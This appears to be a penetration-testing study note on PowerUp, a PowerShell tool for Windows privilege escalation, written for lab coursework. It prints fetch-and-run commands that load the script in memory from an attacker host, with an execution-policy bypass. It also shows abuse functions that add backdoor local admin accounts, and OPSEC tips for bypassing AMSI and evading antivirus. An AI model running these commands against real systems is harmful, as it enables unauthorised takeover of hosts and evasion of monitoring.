# PowerUp

**Tags:** `#powerup` `#privesc` `#windows` `#enumeration` `#postexploit`

PowerShell script for Windows local privilege escalation enumeration. Part of PowerSploit. Checks service misconfigurations, unquoted service paths, weak registry permissions, AlwaysInstallElevated, DLL hijacking opportunities, and more. Runs entirely in memory.

**Source:** https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
**Install:** Download `PowerUp.ps1` — pre-available at `/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1`

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/PowerUp.ps1'); Invoke-AllChecks
```

> [!note]
> `Invoke-AllChecks` is the primary function — runs everything and outputs findings with `AbuseFunction` showing exactly how to exploit each finding. Run in-memory to avoid AV. For a compiled alternative see SharpUp (C# port).

---

## Delivery & Execution

```powershell
# In-memory execution (preferred — no disk write)
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/PowerUp.ps1')
Invoke-AllChecks

# One-liner
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/PowerUp.ps1'); Invoke-AllChecks

# If already uploaded
. .\PowerUp.ps1
Invoke-AllChecks

# Bypass execution policy
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/PowerUp.ps1'); Invoke-AllChecks"
```

---

## Key Functions

```powershell
# Run all checks — Invoke-AllChecks is an ALIAS for the real function Invoke-PrivescAudit
Invoke-AllChecks

# Unquoted service paths
Get-UnquotedService

# Modifiable service binaries
Get-ModifiableServiceFile

# Modifiable service config (ChangeConfig permission)
Get-ModifiableService

# AlwaysInstallElevated registry key
Get-RegistryAlwaysInstallElevated

# Modifiable autorun binaries (Run/RunOnce entries with a writable target)
Get-ModifiableRegistryAutoRun          # NOT "Get-RegistryAutoRun" — that name doesn't exist

# DLL hijack opportunities (modifiable paths in %PATH% / process imports)
Find-PathDLLHijack
Find-ProcessDLLHijack

# Weak file/folder permissions (helper used by the service checks)
Get-ModifiablePath

# Autologon creds in registry
Get-RegistryAutoLogon

# Cached GPP passwords
Get-CachedGPPPassword

# Token privileges — the function is Get-ProcessTokenPrivilege (also *Group / *Type)
Get-ProcessTokenPrivilege

# Other real checks Invoke-AllChecks runs (often missed):
Get-ModifiableScheduledTaskFile        # scheduled task with writable action
Get-UnattendedInstallFile              # leftover unattend.xml / sysprep creds
Get-SiteListPassword                   # McAfee SiteList.xml creds
Get-WebConfig                          # web.config connection-string creds
Get-ApplicationHost                    # IIS applicationHost.config app-pool creds
```

---

## Exploiting Findings

Each finding includes an `AbuseFunction`. Common patterns:

```powershell
# Unquoted service path — write malicious binary to path
Write-ServiceBinary -Name 'VulnSvc' -Path 'C:\Program Files\Vuln\Vuln.exe' -UserName 'backdoor' -Password 'Password123'

# Modifiable service — change binary path
Invoke-ServiceAbuse -Name 'VulnSvc' -UserName 'backdoor' -Password 'Password123'

# AlwaysInstallElevated — install MSI as SYSTEM
Write-UserAddMSI    # creates .msi that adds local admin
# Then: msiexec /quiet /qn /i UserAdd.msi

# Modifiable service binary — replace binary with malicious one
Install-ServiceBinary -Name 'VulnSvc'
```

---

## SharpUp (C# Alternative)

```cmd
# In-memory via execute-assembly (Cobalt Strike / Evil-WinRM)
execute-assembly /path/to/SharpUp.exe audit

# Direct execution
SharpUp.exe audit
SharpUp.exe audit UnquotedServicePath
```

SharpUp source: https://github.com/GhostPack/SharpUp

---

## OPSEC

- PowerShell v5+ logs ScriptBlock content — bypass AMSI before loading
- In-memory execution avoids AV file scanning
- `Invoke-AllChecks` is a known string (and PowerSploit is archived/AMSI-signatured) — obfuscate if needed
- Alternatively use Seatbelt for a broader host recon sweep


> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — service misconfig and weak-permission checks. Broader host survey: [[Tools/Scanning/Seatbelt|Seatbelt]]; all-in-one privesc enum: [[Tools/Scanning/winPEAS|winPEAS]]. Cash in a `SeImpersonate`/`SeAssignPrimaryToken` finding with [[Tools/Lateral Movement/Potato|Potato]].
---

*Created: 2026-03-13*
*Updated: 2026-08-31*
*Model: claude-opus-5*
